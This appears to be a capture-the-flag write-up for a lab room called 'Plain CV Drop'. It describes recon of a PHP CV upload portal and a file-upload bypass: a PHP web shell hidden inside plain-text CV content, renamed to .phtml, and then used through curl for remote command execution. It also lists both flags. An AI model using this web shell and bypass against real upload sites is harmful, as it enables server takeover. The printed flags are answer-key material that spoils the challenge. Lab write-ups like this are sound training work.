The "Plain CV Drop" room is a PHP-based file upload application built to simulate a real-world CV submission portal. The attack chain involves bypassing file upload restrictions to achieve Remote Code Execution (RCE), then abusing a SUID binary to escalate privileges to root.
Flags:

User: THM{0d761960-d1d9-40c1-98ff-1ce525a36d3c}
Root: THM{57e78446-a7de-48c4-aa9b-678bdd5b259e}


Reconnaissance
Navigating to http://10.114.174.16/ revealed a clean CV upload form accepting the following file types: PDF, DOC, DOCX, ODT, and TXT. The page source exposed key details:

Upload endpoint: upload.php
CSRF token protection via hidden form field
A review page at review.php (no password protection — misconfiguration)

html<input type="hidden" name="csrf" value="..." />
<form method="post" action="upload.php" enctype="multipart/form-data">
Running Gobuster against the target revealed two critical findings:
/uploads.jsonl   (Status: 200)
/uploads         (Status: 301)
/review.php      (Status: 200)
The uploads.jsonl file was publicly accessible and contained metadata for every uploaded file including the randomized stored filename — a critical information disclosure vulnerability.

Exploitation — File Upload Bypass
Attempt 1: PHP extension (blocked)
Uploading shell.php with Content-Type: application/pdf returned a 302 redirect — the server rejected it silently.
Attempt 2: PHP content in .txt (MIME check bypass)
Uploading raw PHP code as shell.txt returned "Invalid MIME type" — the server used finfo to check actual file contents.
Solution: Embed PHP in plain text content
By wrapping the PHP payload inside a realistic plain-text CV, the finfo MIME check detected it as text/plain and accepted it:
John Doe
Software Engineer
...
<?php system($_GET["cmd"]); ?>
Upload was accepted. The file was confirmed in the review page as shell.txt.
Burp Suite intercept — rename to .phtml
Using Burp Suite to intercept the upload request, the filename was changed from shell.txt to shell.phtml before forwarding. The server's extension blacklist did not include .phtml.
The uploads.jsonl log confirmed the stored filename:
json{"id":"ccbe94d9909623a1","stored_name":"ccbe94d9909623a1.phtml","orig_name":"shell.phtml",...}
RCE Confirmed
bashcurl "http://10.114.174.16/uploads/ccbe94d9909623a1.phtml?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

